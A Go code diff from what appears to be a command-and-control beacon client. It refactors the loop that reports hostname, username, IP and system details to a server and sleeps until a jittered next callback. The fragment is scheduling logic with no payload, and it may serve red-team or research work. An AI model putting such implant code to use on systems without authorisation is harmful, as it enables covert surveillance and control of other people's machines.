@@ -115,7 +115,8 @@ func main() {
 		logger.Logf(logger.Info, "Beacon connected")
 
 		ip := client_utils.GetLocalIP(beacon)
-		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory); err != nil {
+		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
+		if err := client_utils.HandleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, ServerIP, ServerPort, CallbackFrequency, CallbackJitter, nextCallback); err != nil {
 			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
@@ -137,7 +138,14 @@ func main() {
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
-		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
+		sleepDuration := time.Until(nextCallback)
+
+		if sleepDuration > 0 {
+			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
+			time.Sleep(sleepDuration)
+		} else {
+			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
+		}
 	}
 }
 
